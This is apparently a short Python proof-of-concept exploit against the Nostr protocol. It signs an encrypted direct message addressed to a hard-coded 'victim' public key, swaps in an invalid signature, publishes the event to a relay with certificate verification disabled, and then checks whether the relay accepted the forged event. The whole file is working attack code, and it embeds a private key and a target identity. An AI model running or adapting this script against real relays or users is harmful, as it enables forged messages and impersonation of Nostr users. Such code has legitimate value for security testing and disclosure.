import sys,os
import random,string,json,base64
sys.path.append(os.path.join(os.path.dirname(__file__), './python-nostr/'))
from nostr.event import Event, EventKind, EncryptedDirectMessage
from nostr.relay_manager import RelayManager
from nostr.key import PrivateKey, PublicKey
from nostr.filter import Filter, Filters
from nostr.message_type import ClientMessageType

import time, ssl
SECRET_KEY = "2659a8fd4844dd4a1489ec277e21d6c548f30dba29452130746d4ad16a423adc"
VICTIM_PUBKEY_NPUB = "npub17l5u796sc67sneg25ylyas47hsxxuypxdy4raz5r5vjattn0parssg4grf"
#VICTIM_PUBKEY_NPUB = "npub104vk2544drsc6uwspxlvvv98r4hspv5pwuekmznwnljvdd4qn05qlxxhnk"
VICTIM_PUBKEY = PublicKey.from_npub(VICTIM_PUBKEY_NPUB).hex()

relay_manager = RelayManager()
relay_manager.add_relay("wss://relay.example.com")
relay_manager.open_connections({"cert_reqs": ssl.CERT_NONE}) # NOTE: This disables ssl certificate verification

nostr_key = PrivateKey(raw_secret=bytes.fromhex(SECRET_KEY))
#VICTIM_PUBKEY = PublicKey(raw_bytes=bytes.fromhex(VICTIM_PUBKEY))
published_event_ids = list()

dm = EncryptedDirectMessage(
  recipient_pubkey=VICTIM_PUBKEY,
  #cleartext_content="0123456789abcdef0123456789abcdef0123456789abcdef"
  cleartext_content="Bypass!"
)

nostr_key.sign_event(dm)

# replace sig with invalid sig
dm.signature = '56cbf291033215020feb533e2898c1634d7a8a2699f06533c73b2bcda6ff86f4c7e0363e5e6d45e68fa54736125c6505c46bcc3943e69a40f110005f6e639da8'
#dm.signature = os.urandom(64).hex()
#print(dm.signature, len(dm.signature))

relay_manager.publish_event(dm)

filters = Filters([Filter(authors=[nostr_key.public_key.hex()], kinds=[EventKind.ENCRYPTED_DIRECT_MESSAGE])])
subscription_id = "".join(random.choices(string.ascii_lowercase, k=64))
request = [ClientMessageType.REQUEST, subscription_id]
request.extend(filters.to_json_array())
relay_manager.add_subscription(subscription_id, filters)

message = json.dumps(request)
relay_manager.publish_message(message)
time.sleep(1) # allow the messages to send

while relay_manager.message_pool.has_events():
  event_msg = relay_manager.message_pool.get_event()
  #print(event_msg)
  #print(event_msg.event.id)
  published_event_ids.append(event_msg.event.id)


#print("---")
#print(dm.id)
#print(published_event_ids)
#print(dm.id in published_event_ids)

relay_manager.close_connections()
